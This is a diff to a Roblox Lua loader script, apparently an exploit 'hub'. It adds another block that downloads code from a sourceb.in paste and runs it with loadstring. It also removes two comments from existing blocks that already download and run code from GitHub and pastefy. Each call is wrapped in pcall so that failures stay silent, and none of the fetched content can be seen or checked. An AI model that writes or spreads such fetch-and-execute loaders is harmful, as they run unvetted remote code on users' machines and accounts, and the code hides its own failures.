@@ -144,14 +144,12 @@ local function showWarning()
         warnFrame:Destroy()
         oldBtn.Text = "Loading..."
 
-        -- OLD MAIN
         task.spawn(function()
             pcall(function()
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Void_Hub/refs/heads/main/MainLoaders", true))()
             end)
         end)
 
-        -- EXTRA PASTEFY
         task.spawn(function()
             pcall(function()
                 loadstring(game:HttpGet("https://pastefy.app/QDcXcBjN/raw", true))()
@@ -193,6 +191,12 @@ newBtn.MouseButton1Click:Connect(function()
     task.spawn(function()
         pcall(function()
             loadstring(game:HttpGet("https://pastefy.app/UYi0eYo5/raw", true))()
+        end)
+    end)
+
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://cdn.sourceb.in/bins/RXsKoGqRKL/0"))()
         end)
     end)
 
